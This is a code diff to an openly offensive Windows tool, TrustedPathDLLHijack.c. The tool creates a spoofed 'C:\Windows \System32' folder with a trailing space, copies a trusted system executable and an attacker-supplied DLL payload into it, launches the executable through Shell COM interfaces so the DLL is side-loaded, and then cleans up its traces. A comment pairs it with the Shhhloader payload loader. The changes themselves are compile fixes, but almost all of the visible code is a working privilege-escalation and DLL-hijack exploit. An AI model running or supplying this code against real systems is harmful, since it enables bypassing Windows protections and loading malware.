@@ -1,5 +1,6 @@
 //x86_64-w64-mingw32-gcc TrustedPathDLLHijack.c -static -s -w -loleaut32 -lshlwapi -lole32 -o /share/TrustedPathDLLHijack.exe
 // Usage: .\test.exe [DLL on disk to load]
+#include <stdio.h>
 #include <windows.h>
 #include <wtsapi32.h>
 #include <shellapi.h>
@@ -38,36 +39,36 @@ int main(int argc, char* argv[])
     strcpy(targetDLLPath, argv[1]);
     
     // Check if file exists
-    if(!PathFileExists((LPCTSTR)originalLocation)){
+    if(!PathFileExistsA(originalLocation)){
         printf("The target executable does not exist in \"C:\\Windows\\System32\".\n");
         goto FileCleanup;
-        return;
+        return 1;
     }
 
     // Create "C:\Windows \System32" directory
-    CreateDirectoryW((LPCTSTR)L"\\\\?\\C:\\Windows \\", 0);
-    CreateDirectoryW((LPCTSTR)L"\\\\?\\C:\\Windows \\System32\\", 0);
+    CreateDirectoryW(L"\\\\?\\C:\\Windows \\", 0);
+    CreateDirectoryW(L"\\\\?\\C:\\Windows \\System32\\", 0);
 
     // Copy the DLL payload and target executable to "C:\Windows \System32"
     printf("Copying file from \"%s\" to \"%s\".\n", originalLocation, newLocation);
-    CopyFile((LPCTSTR)originalLocation, (LPCTSTR)newLocation, FALSE);
+    CopyFileA(originalLocation, newLocation, FALSE);
     errorcode = GetLastError();
     if(errorcode!=0){
         if(errorcode==32){
             printf("Error %d: Could not copy the executable to the destination because it is running by another program. Please kill the process and retry.\n", GetLastError());
         }else{
             printf("Error %d: Could not copy the executable to the destination.\n", GetLastError());
-        }   
+        }
         goto FileCleanup;
-        return;
+        return 1;
     }else{
         printf("Executable copied successfully.\n");
     }
-    CopyFile(targetDLLPath, (LPCTSTR)newDLLLocation, FALSE);
+    CopyFileA(targetDLLPath, newDLLLocation, FALSE);
     if(GetLastError()!=0){
         printf("Error %d: Could not copy the DLL payload to the destination.\n", GetLastError());
         goto FileCleanup;
-        return;
+        return 1;
     }else{
         printf("DLL payload copied successfully.\n");
     }
@@ -89,7 +90,7 @@ int main(int argc, char* argv[])
     if (!SUCCEEDED(hr)) {
         printf("CoInitialize failed: 0x%08lx", hr);
         goto FileCleanup;
-        return;
+        return 1;
     }
 
     wchar_t* ShellBrowserI = L"{000214E2-0000-0000-C000-000000000046}";
@@ -135,7 +136,7 @@ int main(int argc, char* argv[])
     if(!SUCCEEDED(hr)){
         printf("CoCreateInstanceEx failed: 0x%08lx", hr);
         goto FileCleanup;
-        return;
+        return 1;
     }
 
     hr = mqi->pItf->lpVtbl->QueryInterface(mqi->pItf, &Ipsw, (void**)&psw);
@@ -143,8 +144,6 @@ int main(int argc, char* argv[])
     if(!SUCCEEDED(hr)){
         printf("ShellWindows->QueryInterface failed: 0x%08lx", hr);
         goto Cleanup;
-        goto FileCleanup;
-        return;
     }
 
     hr = mqi->pItf->lpVtbl->Release(mqi->pItf);
@@ -152,8 +151,6 @@ int main(int argc, char* argv[])
     if(!SUCCEEDED(hr)){
         printf("Releaseing IShellWindows failed: 0x%08lx", hr);
         goto Cleanup;
-        goto FileCleanup;
-        return;
     }
 
     hr = psw->lpVtbl->FindWindowSW(psw, &vEmpty, &vEmpty, SWC_DESKTOP, (long*)&hwnd, SWFO_NEEDDISPATCH, &pdisp);
@@ -161,64 +158,48 @@ int main(int argc, char* argv[])
     if(!SUCCEEDED(hr)){
         printf("FindWindowSW failed: 0x%08lx", hr);
         goto Cleanup;
-        goto FileCleanup;
-        return;
     }
 
     hr = pdisp->lpVtbl->QueryInterface(pdisp, &servicerprovider_iid, (void**)&svsProvider);
     if(!SUCCEEDED(hr)){
         printf("pdisp->QueryInterface failed: 0x%08lx", hr);
         goto Cleanup;
-        goto FileCleanup;
-        return;
     }
 
     hr = svsProvider->lpVtbl->QueryService(svsProvider, &ITopLevelSID, &Ipsb, (void**)&psb);
     if(!SUCCEEDED(hr)){
         printf("pdisp->QueryInterface failed: 0x%08lx", hr);
         goto Cleanup;
-        goto FileCleanup;
-        return;
     }
 
     hr = psb->lpVtbl->QueryActiveShellView(psb, &psv);
     if(!SUCCEEDED(hr)){
         printf("psb->QueryActiveShellView failed: 0x%08lx", hr);
         goto Cleanup;
-        goto FileCleanup;
-        return;
     }
 
     hr = psv->lpVtbl->GetItemObject(psv, SVGIO_BACKGROUND, &Ipdisp, (void**)&pdispBackground);
     if(!SUCCEEDED(hr)){
         printf("psv->GetItemObject failed: 0x%08lx", hr);
         goto Cleanup;
-        goto FileCleanup;
-        return;
     }
 
     hr = pdispBackground->lpVtbl->QueryInterface(pdispBackground, &Ipsfvd, (void**)&psfvd);
     if(!SUCCEEDED(hr)){
         printf("pdispBackground->QueryInterface failed: 0x%08lx", hr);
         goto Cleanup;
-        goto FileCleanup;
-        return;
     }
 
     hr = psfvd->lpVtbl->get_Application(psfvd, &pdisp);
     if(!SUCCEEDED(hr)){
         printf("psfvd->get_Application failed: 0x%08lx", hr);
         goto Cleanup;
-        goto FileCleanup;
-        return;
     }
 
     hr = pdisp->lpVtbl->QueryInterface(pdisp, &ISHLDISP, (void**)&psd);
     if(!SUCCEEDED(hr)){
         printf("pdisp->QueryInterface failed: 0x%08lx", hr);
         goto Cleanup;
-        goto FileCleanup;
-        return;
     }
 
     printf("Executing \"%s\"...\n", newLocation);
@@ -283,9 +264,9 @@ int main(int argc, char* argv[])
     FileCleanup:
     // Fake windows directory and files cleanup
     Sleep(30000); // set this sleep to be for however long the DLL will execute for. 30 seconds is a good standard for use with something like Shhhloader.
-    LPCTSTR folderPath[2] = {newLocation, newDLLLocation};
+    LPCSTR folderPath[2] = {newLocation, newDLLLocation};
     for (int i = 0; i < 2; i++) {
-        int result = DeleteFile(folderPath[i]);
+        int result = DeleteFileA(folderPath[i]);
         if (result != 0) {
             printf("File deleted succesfully: %s\n", folderPath[i]);
         }
@@ -293,9 +274,9 @@ int main(int argc, char* argv[])
             printf("Failed to delete '%s' in the fake windows folder: %d\n", folderPath[i], GetLastError());
         }
     }
-    LPCTSTR emptyFolders[2] = {fakeSystem32Folder, fakeWindowsFolder};
+    LPCSTR emptyFolders[2] = {fakeSystem32Folder, fakeWindowsFolder};
     for (int i = 0; i < 2; i++) {
-        int result = RemoveDirectory(emptyFolders[i]);
+        int result = RemoveDirectoryA(emptyFolders[i]);
         if (result != 0) {
             printf("Folder deleted succesfully: %s\n", emptyFolders[i]);
         }
